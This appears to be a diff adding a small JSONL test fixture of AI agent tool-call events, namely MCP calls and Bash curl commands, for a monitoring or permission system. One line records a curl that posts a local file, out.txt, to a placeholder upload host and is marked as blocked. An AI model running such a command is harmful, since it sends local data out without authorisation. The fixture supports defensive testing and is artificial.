@@ -1,0 +1,7 @@
+{"session_id":"s0","category":"mcp","tool_name":"mcp__notes__list","mcp_server":"notes","mcp_tool":"list","ts":"2025-12-10T00:00:00.000Z"}
+{"session_id":"s1","category":"mcp","tool_name":"mcp__notes__list","mcp_server":"notes","mcp_tool":"list"}
+{"session_id":"s1","category":"process_creation","tool_name":"Bash","command_line":"curl -s https://api.example.invalid"}
+{"session_id":"s2","category":"mcp","tool_name":"mcp__helper__save","mcp_server":"helper","mcp_tool":"save"}
+{"session_id":"s2","category":"process_creation","tool_name":"Bash","command_line":"curl -s http://localhost:8080/health"}
+{"session_id":"s3","category":"mcp","tool_name":"mcp__other__run","mcp_server":"other","mcp_tool":"run"}
+{"session_id":"s3","category":"process_creation","tool_name":"Bash","command_line":"curl -s https://upload.example.invalid -d @out.txt","outcome":"blocked","denial_kind":"automode-blocked"}
